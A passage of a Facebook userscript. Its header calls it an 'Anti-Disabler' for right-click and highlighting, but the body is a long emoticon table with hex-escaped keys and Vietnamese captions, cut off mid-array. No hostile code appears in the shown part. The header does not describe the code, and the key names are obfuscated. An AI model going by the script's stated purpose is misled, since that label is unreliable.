// ==UserScript==
// @name            Anti-Disabler (Enable right-click and highlight)
// @namespace       Anti-Disabler (Enable right-click and highlight)
// @Hak Cipta       Smart Boy
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==ChiBi==
(function () {
    if (!document['querySelector']('#pageNav')) {
        return;
    };
    var _0x3384x1 = [{
        "\x63\x68\x61\x72\x73": ' :) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_smile',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi t\u01B0\u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' :( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_frown',
        "\x6E\x61\x6D\x65": 'Bu\u1ED3n ch\xE1n'
    }, {
        "\x63\x68\x61\x72\x73": ' :P ',
        "\x63\x6C\x61\x73\x73": 'emoticon_tongue',
        "\x6E\x61\x6D\x65": 'L\xE8 l\u01B0\u1EE1i'
    }, {
        "\x63\x68\x61\x72\x73": ' :D ',
        "\x63\x6C\x61\x73\x73": 'emoticon_grin',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi toe'
    }, {
        "\x63\x68\x61\x72\x73": ' :o ',
        "\x63\x6C\x61\x73\x73": 'emoticon_gasp',
        "\x6E\x61\x6D\x65": 'Ng\u1EA1c nhi\xEAn'
    }, {
        "\x63\x68\x61\x72\x73": ' ;) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_wink',
        "\x6E\x61\x6D\x65": 'Nh\xE1y m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' :v ',
        "\x63\x6C\x61\x73\x73": 'emoticon_pacman',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi h\xE1 mi\u1EC7ng'
    }, {
        "\x63\x68\x61\x72\x73": ' >:( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_grumpy',
        "\x6E\x61\x6D\x65": 'Nh\u0103n m\u1EB7t'
    }, {
        "\x63\x68\x61\x72\x73": ' :/ ',
        "\x63\x6C\x61\x73\x73": 'emoticon_unsure',
        "\x6E\x61\x6D\x65": 'M\u1EBFu'
    }, {
        "\x63\x68\x61\x72\x73": ' :\'( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_cry',
        "\x6E\x61\x6D\x65": 'Kh\xF3c'
    }, {
        "\x63\x68\x61\x72\x73": ' ^_^ ',
        "\x63\x6C\x61\x73\x73": 'emoticon_kiki',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi t\xEDt m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' 8) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_glasses',
        "\x6E\x61\x6D\x65": '\u0110eo k\xEDnh tr\u1EAFng'
    }, {
        "\x63\x68\x61\x72\x73": ' B| ',
        "\x63\x6C\x61\x73\x73": 'emoticon_sunglasses',
        "\x6E\x61\x6D\x65": '\u0110eo k\xEDnh \u0111en'
    }, {
        "\x63\x68\x61\x72\x73": ' <3 ',
        "\x63\x6C\x61\x73\x73": 'emoticon_heart',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim'
    }, {
        "\x63\x68\x61\x72\x73": ' 3:) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_devil',
        "\x6E\x61\x6D\x65": 'Qu\u1EF7 s\u1EE9'
    }, {
        "\x63\x68\x61\x72\x73": ' O:) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_angel',
        "\x6E\x61\x6D\x65": 'Thi\xEAn th\u1EA7n'
    }, {
        "\x63\x68\x61\x72\x73": ' -_- ',
        "\x63\x6C\x61\x73\x73": 'emoticon_squint',
        "\x6E\x61\x6D\x65": 'Nh\u1EAFm m\u1EAFt l\u1EA1i'
    }, {
        "\x63\x68\x61\x72\x73": ' o.O ',
        "\x63\x6C\x61\x73\x73": 'emoticon_confused',
        "\x6E\x61\x6D\x65": 'Tr\u1EE3n tr\xF2n m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' >:o ',
        "\x63\x6C\x61\x73\x73": 'emoticon_upset',
        "\x6E\x61\x6D\x65": 'Kh\xF3 ch\u1ECBu qu\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' :3 ',
        "\x63\x6C\x61\x73\x73": 'emoticon_colonthree',
        "\x6E\x61\x6D\x65": 'Kh\xF4ng quan t\xE2m'
    }, {
        "\x63\x68\x61\x72\x73": ' (y) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_like',
        "\x6E\x61\x6D\x65": 'Th\xEDch'
    }, {
        "\x63\x68\x61\x72\x73": ' :* ',
        "\x63\x6C\x61\x73\x73": 'emoticon emoticon_kiss',
        "\x6E\x61\x6D\x65": 'H\xF4n c\xE1i coi'
    }, {
        "\x63\x68\x61\x72\x73": ' (^^^) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_shark',
        "\x6E\x61\x6D\x65": 'C\xE1 heo t\u1EE9c gi\u1EADn'
    }, {
        "\x63\x68\x61\x72\x73": ' :|] ',
        "\x63\x6C\x61\x73\x73": 'emoticon_robot',
        "\x6E\x61\x6D\x65": 'Robot'
    }, {
        "\x63\x68\x61\x72\x73": ' <(") ',
        "\x63\x6C\x61\x73\x73": 'emoticon_penguin',
        "\x6E\x61\x6D\x65": 'Chim c\xE1nh c\u1EE5t'
    }, {
        "\x63\x68\x61\x72\x73": ' :poop: ',
        "\x63\x6C\x61\x73\x73": 'emoticon_poop',
        "\x6E\x61\x6D\x65": '\u0102n shit nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' :putnam: ',
        "\x63\x6C\x61\x73\x73": 'emoticon_putnam',
        "\x6E\x61\x6D\x65": 'Th\u1EBF c\u01A1 \xE1?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF02 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c0',
        "\x6E\x61\x6D\x65": 'M\u01B0a r\u1ED3i, \xF4 n\xE8'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF0A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c1',
        "\x6E\x61\x6D\x65": 'S\xF3ng bi\u1EC3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF19 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c2',
        "\x6E\x61\x6D\x65": 'V\u1EA7ng tr\u0103ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF1F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c3',
        "\x6E\x61\x6D\x65": 'Ng\xF4i sao'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c4',
        "\x6E\x61\x6D\x65": 'C\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF34 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c5',
        "\x6E\x61\x6D\x65": 'C\xE2y c\xF4 \u0111\u01A1n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c6',
        "\x6E\x61\x6D\x65": 'X\u01B0\u01A1ng r\u1ED3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c7',
        "\x6E\x61\x6D\x65": 'Hoa Tulip'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c8',
        "\x6E\x61\x6D\x65": 'Hoa 5 c\xE1nh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c9',
        "\x6E\x61\x6D\x65": 'Hoa h\u1ED3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ca',
        "\x6E\x61\x6D\x65": 'C\xE2y hoa tr\xF2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cb',
        "\x6E\x61\x6D\x65": 'Hoa h\u01B0\u1EDBng d\u01B0\u01A1ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cc',
        "\x6E\x61\x6D\x65": 'C\xE2y l\xFAa'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cd',
        "\x6E\x61\x6D\x65": 'Hoa 4 m\xF9a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF41 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ce',
        "\x6E\x61\x6D\x65": 'L\xE1 phong'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF42 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cf',
        "\x6E\x61\x6D\x65": 'L\xE1 Fallen'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF43 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cg',
        "\x6E\x61\x6D\x65": 'L\xE1 xanh tr\u01B0\u1EDBc gi\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF4A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ch',
        "\x6E\x61\x6D\x65": 'Qu\u1EA3 qu\xFDt'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF4E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ci',
        "\x6E\x61\x6D\x65": 'T\xE1o \u0111\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF53 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cj',
        "\x6E\x61\x6D\x65": 'D\xE2u t\xE2y, \u0103n \u0111i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF54 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ck',
        "\x6E\x61\x6D\x65": 'B\xE1nh m\u1EF3 ba t\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF78 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cl',
        "\x6E\x61\x6D\x65": 'N\u01B0\u1EDBc hoa qu\u1EA3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF7A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cm',
        "\x6E\x61\x6D\x65": 'Bia'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF81 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cn',
        "\x6E\x61\x6D\x65": 'H\u1ED9p qu\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF83 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2co',
        "\x6E\x61\x6D\x65": 'Qu\u1EA3 b\xED ng\xF4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF84 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cp',
        "\x6E\x61\x6D\x65": 'C\xE2y th\xF4ng Noel'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF85 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cq',
        "\x6E\x61\x6D\x65": '\xD4ng gi\xE0 Noel'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF88 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cr',
        "\x6E\x61\x6D\x65": 'B\xF3ng bay'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF89 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cs',
        "\x6E\x61\x6D\x65": 'K\xE8n cho Party'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ct',
        "\x6E\x61\x6D\x65": 'V\u01B0\u01A1ng mi\u1EC7ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cu',
        "\x6E\x61\x6D\x65": 'C\u1EB7p \u0111\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cv',
        "\x6E\x61\x6D\x65": '\u0110\xF4i c\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF90 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cw',
        "\x6E\x61\x6D\x65": 'K\u1EB9o gi\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF93 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cx',
        "\x6E\x61\x6D\x65": 'M\u0169 c\u1EED nh\xE2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFB5 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cy',
        "\x6E\x61\x6D\x65": 'B\u1EA3n nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFB6 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cz',
        "\x6E\x61\x6D\x65": 'N\u1ED1t nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFBC ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c-',
        "\x6E\x61\x6D\x65": '\xC2m nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC0D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c_',
        "\x6E\x61\x6D\x65": 'Con r\u1EAFn'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC0E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d0',
        "\x6E\x61\x6D\x65": 'Con ng\u1EF1a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC11 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d1',
        "\x6E\x61\x6D\x65": 'Con d\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC12 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d2',
        "\x6E\x61\x6D\x65": 'Con khi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d3',
        "\x6E\x61\x6D\x65": 'Con g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC17 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d4',
        "\x6E\x61\x6D\x65": 'Con l\u1EE3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC18 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d5',
        "\x6E\x61\x6D\x65": 'Con voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC19 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d6',
        "\x6E\x61\x6D\x65": 'Con b\u1EA1ch tu\u1ED9c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d7',
        "\x6E\x61\x6D\x65": 'Con \u1ED1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d8',
        "\x6E\x61\x6D\x65": 'Con ch\u0103n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d9',
        "\x6E\x61\x6D\x65": 'Con c\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC20 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2da',
        "\x6E\x61\x6D\x65": 'C\xE1 c\u1EA3nh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC21 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2db',
        "\x6E\x61\x6D\x65": 'C\xE1 mang ph\xECnh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC25 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dc',
        "\x6E\x61\x6D\x65": 'G\xE0 con'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC26 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dd',
        "\x6E\x61\x6D\x65": 'Con chim'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC27 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2de',
        "\x6E\x61\x6D\x65": 'Chim c\xE1nh c\u1EE5t 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC28 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2df',
        "\x6E\x61\x6D\x65": 'G\u1EA5u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC29 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dg',
        "\x6E\x61\x6D\x65": 'Ch\xF3 th\xE8 l\u01B0\u1EE1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dh',
        "\x6E\x61\x6D\x65": 'Con l\u1EA1c \u0111\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2di',
        "\x6E\x61\x6D\x65": 'Con c\xE1 voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dj',
        "\x6E\x61\x6D\x65": 'M\u1EB7t chu\u1ED9t'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dk',
        "\x6E\x61\x6D\x65": 'M\u1EB7t b\xF2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dl',
        "\x6E\x61\x6D\x65": 'M\u1EB7t m\xE8o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC30 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dm',
        "\x6E\x61\x6D\x65": 'M\u1EB7t th\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dn',
        "\x6E\x61\x6D\x65": 'M\u1EB7t m\xE8o l\u01B0\u1EDDi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC33 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2do',
        "\x6E\x61\x6D\x65": 'C\xE1 voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC34 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dp',
        "\x6E\x61\x6D\x65": 'M\u1EB7t ng\u1EF1a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dq',
        "\x6E\x61\x6D\x65": 'M\u1EB7t kh\u1EC9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dr',
        "\x6E\x61\x6D\x65": 'M\u1EB7t l\u1EE3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ds',
        "\x6E\x61\x6D\x65": 'M\u1EB7t \u1EBFch'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dt',
        "\x6E\x61\x6D\x65": 'M\u1EB7t chu\u1ED9t Hamster'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2du',
        "\x6E\x61\x6D\x65": 'M\u1EB7t ch\xF3 s\xF3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dv',
        "\x6E\x61\x6D\x65": 'M\u1EB7t g\u1EA5u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dw',
        "\x6E\x61\x6D\x65": 'B\xE0n ch\xE2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dx',
        "\x6E\x61\x6D\x65": 'Ng\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC42 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dy',
        "\x6E\x61\x6D\x65": 'H\xF3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC43 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dz',
        "\x6E\x61\x6D\x65": 'M\u0169i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC44 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d-',
        "\x6E\x61\x6D\x65": 'H\xF4n mi\u1EBFng n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC45 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d_',
        "\x6E\x61\x6D\x65": 'Te t\u1EDFn'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC46 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e0',
        "\x6E\x61\x6D\x65": '\u0110\u1EE9a comment \u1EDF tr\xEAn r\u1EA5t g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC47 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e1',
        "\x6E\x61\x6D\x65": '\u0110\u1EE9a comment \u1EDF d\u01B0\u1EDBi r\u1EA5t g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC48 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e2',
        "\x6E\x61\x6D\x65": 'B\xEAn tr\xE1i em \u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC49 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e3',
        "\x6E\x61\x6D\x65": 'B\xEAn ph\u1EA3i em \u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e4',
        "\x6E\x61\x6D\x65": 'N\xE0y th\xEC nh\xECn \u0111\u1EC3u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e5',
        "\x6E\x61\x6D\x65": 'V\u1ED7 tay ngay & lu\xF4n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e6',
        "\x6E\x61\x6D\x65": 'OK, anh hi\u1EC3u r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e7',
        "\x6E\x61\x6D\x65": '\u01AFng \xFD c\u1EE7a th\xEDm r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e8',
        "\x6E\x61\x6D\x65": '\xDD th\xEDm nh\u01B0 ***'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e9',
        "\x6E\x61\x6D\x65": '\u1EE6ng h\u1ED9 nhi\u1EC7t t\xECnh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC50 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ea',
        "\x6E\x61\x6D\x65": 'C\xF2ng tay em l\u1EA1i \u0111i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC66 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eb',
        "\x6E\x61\x6D\x65": 'HOT Boy'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC67 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ec',
        "\x6E\x61\x6D\x65": 'HOT Girl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC68 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ed',
        "\x6E\x61\x6D\x65": 'X - Men'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC69 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ee',
        "\x6E\x61\x6D\x65": 'Ph\u1EE5 n\u1EEF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ef',
        "\x6E\x61\x6D\x65": 'N\u1EAFm tay c\xE1i xem n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eg',
        "\x6E\x61\x6D\x65": 'Gi\u1EDD c\xE1c th\xEDm mu\u1ED1n g\xEC? C\u1EA3nh s\xE1t \u0111\xE2y'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eh',
        "\x6E\x61\x6D\x65": 'M\u1EDBi t\u1EADu c\xE1i tai th\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC71 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ei',
        "\x6E\x61\x6D\x65": '\u0110\u1EA7u m\u1EDBi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC72 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ej',
        "\x6E\x61\x6D\x65": 'Nh\xECn c\u0169ng \u0111\u1EADp chai ph\u1EBFt'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC73 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ek',
        "\x6E\x61\x6D\x65": '\u0110\xE2y \u0111\u1EADp h\u01A1n nha c\u01B0ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC74 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2el',
        "\x6E\x61\x6D\x65": '\u1EEA, c\xF2n m\xECnh th\xEC gi\xE0 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC75 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2em',
        "\x6E\x61\x6D\x65": 'Em c\u0169ng gi\xE0 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC76 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2en',
        "\x6E\x61\x6D\x65": 'M\xECnh c\xF2n nh\u1ECF qu\xE1, ch\u1ECBu kh\xF3 FA v\u1EADy'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC77 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eo',
        "\x6E\x61\x6D\x65": '\u0110\u1ED9i m\u0169 \u0111i l\xE0m n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC78 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ep',
        "\x6E\x61\x6D\x65": 'C\xF4ng ch\xFAa'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eq',
        "\x6E\x61\x6D\x65": 'Ma \u0111\xE2y, xo\u1EAFn ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2er',
        "\x6E\x61\x6D\x65": 'Em l\xE0 thi\xEAn th\u1EA7n, nh\xECn em gi\u1ED1ng con \u0111\u1EA7n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2es',
        "\x6E\x61\x6D\x65": 'H\u1ED5 b\xE1o th\u1EBF n\xE0y \u0111\u01B0\u1EE3c ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2et',
        "\x6E\x61\x6D\x65": 'H\u1ED5 b\xE1o t\u1EEB m\u1EABu gi\xE1o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eu',
        "\x6E\x61\x6D\x65": '\u0110\u1EE7 c\u1EE9ng ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC80 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ev',
        "\x6E\x61\x6D\x65": '\u0110\u1EA7u l\xE2u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC82 ',
